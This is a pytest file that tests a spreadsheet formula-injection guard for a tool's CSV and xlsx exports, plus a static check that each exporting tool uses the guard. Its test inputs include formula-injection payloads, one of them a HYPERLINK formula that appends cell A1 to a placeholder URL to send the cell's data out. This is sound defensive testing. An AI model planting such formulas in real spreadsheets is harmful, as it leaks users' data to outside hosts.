"""paperpull_core.sheets, the rule that keeps text a spreadsheet tool writes
from becoming a formula, and the census that every tool writing a
spreadsheet for a person goes through it. The write paths of the two tools
are tested in test_export_purchases.py and test_export_transactions.py.
Every value here is made up."""
import ast
from pathlib import Path

import pytest

from paperpull_core.sheets import csv_value, keep_text, starts_a_formula

TOOLS = Path(__file__).resolve().parents[2] / "tools"

FORMULAS = [
    "=1+1", "+1+1", "-1+1", "@SUM(1,1)",
    '=HYPERLINK("https://example.invalid/?"&A1,"open")',
    "\t=1+1", "\r=1+1", "\n=1+1", "\tplain words after a tab",
    " =1+1", "   @SUM(1,1)", " =1+1",
    "-", "+", "=", "@", "-.5", "-1e3", "-1,2", "-12.34x", "--12", "+12.34",
]
TEXT = ["", "Kettle", "a=b", "1-1", "12.34", "1,234.56", "'=1+1", "(12.34)",
        "PAYMENT - THANK YOU", "AplPay EXAMPLE STORE"]
PLAIN_NEGATIVE = ["-12.34", "-1,234.56", "-42", "-0.5", "-1,000,000", " -12.34"]


@pytest.mark.parametrize("text", FORMULAS)
def test_text_that_could_start_a_formula_is_caught(text):
    assert starts_a_formula(text)
    assert csv_value(text) == "'" + text


@pytest.mark.parametrize("text", TEXT + PLAIN_NEGATIVE)
def test_other_text_and_a_plain_negative_number_are_left_alone(text):
    assert not starts_a_formula(text)
    assert csv_value(text) == text


def test_a_number_is_written_as_a_number_and_none_as_an_empty_cell():
    assert csv_value(-12.34) == -12.34
    assert csv_value(3) == 3
    assert csv_value(0.0) == 0.0
    assert csv_value(None) == ""


def test_an_xlsx_cell_holding_text_is_a_string_cell_with_its_value_unchanged():
    openpyxl = pytest.importorskip("openpyxl")
    ws = openpyxl.Workbook().active
    cells = {}
    for i, value in enumerate(FORMULAS + TEXT + PLAIN_NEGATIVE + ["#N/A", "#DIV/0!"], start=1):
        cell = ws.cell(row=i, column=1)
        cell.value = value
        keep_text(cell)
        cells[value] = cell
    for value, cell in cells.items():
        assert cell.data_type == "s" and cell.value == value, value
        assert cell.quotePrefix is starts_a_formula(value), value


def test_an_xlsx_number_and_an_empty_cell_are_left_as_they_were():
    openpyxl = pytest.importorskip("openpyxl")
    ws = openpyxl.Workbook().active
    amount, count, empty = ws["A1"], ws["A2"], ws["A3"]
    amount.value, count.value = -12.34, 7
    for cell in (amount, count, empty):
        keep_text(cell)
    assert (amount.data_type, amount.value, amount.quotePrefix) == ("n", -12.34, False)
    assert (count.data_type, count.value) == ("n", 7)
    assert empty.value is None and empty.data_type == "n"


# -- the census -------------------------------------------------------------------

# A tool in tools/ that writes a spreadsheet and need not go through the
# rule, with the reason. Anything else that writes one has to.
NOT_FOR_PEOPLE = {
    "make_sample.py": "writes the sample archive's own invented records, in the "
                      "format the apps write, for the exporters to read",
    "snapshot_traffic.py": "writes the repository's daily view and clone counts, "
                           "dates and numbers only",
}
# What each kind of spreadsheet has to be written through.
NEEDS = {"csv": "csv_value", "xlsx": "keep_text"}


def _kinds(tree) -> set:
    """Which spreadsheets a tool writes, a CSV through the csv module's
    writers and an xlsx through openpyxl's Workbook."""
    kinds = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Attribute) and node.attr in ("writer", "DictWriter") \
                and isinstance(node.value, ast.Name) and node.value.id == "csv":
            kinds.add("csv")
        if isinstance(node, ast.ImportFrom) and (node.module or "").startswith("openpyxl") \
                and any(a.name == "Workbook" for a in node.names):
            kinds.add("xlsx")
    return kinds


def _calls_from_the_rule(tree) -> set:
    """The names imported from paperpull_core.sheets that the tool calls."""
    names = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module == "paperpull_core.sheets":
            names |= {a.name for a in node.names}
    called = {n.func.id for n in ast.walk(tree)
              if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)}
    return names & called


def writers() -> dict:
    out = {}
    for p in sorted(TOOLS.glob("*.py")):
        tree = ast.parse(p.read_text(encoding="utf-8"))
        if _kinds(tree):
            out[p.name] = tree
    return out


def test_the_census_finds_both_spreadsheet_tools_and_what_each_writes():
    found = {name: _kinds(tree) for name, tree in writers().items()}
    assert found["export_purchases.py"] == {"csv", "xlsx"}
    assert found["export_transactions.py"] == {"csv", "xlsx"}


@pytest.mark.parametrize("name", sorted(set(writers()) - set(NOT_FOR_PEOPLE)))
def test_every_tool_writing_a_spreadsheet_for_a_person_goes_through_the_rule(name):
    tree = writers()[name]
    missing = {NEEDS[k] for k in _kinds(tree)} - _calls_from_the_rule(tree)
    assert not missing, "%s writes a spreadsheet without paperpull_core.sheets' %s" % (
        name, ", ".join(sorted(missing)))


def test_a_tool_set_aside_still_writes_one_and_says_why():
    assert set(NOT_FOR_PEOPLE) <= set(writers())
    assert all(why.strip() for why in NOT_FOR_PEOPLE.values())
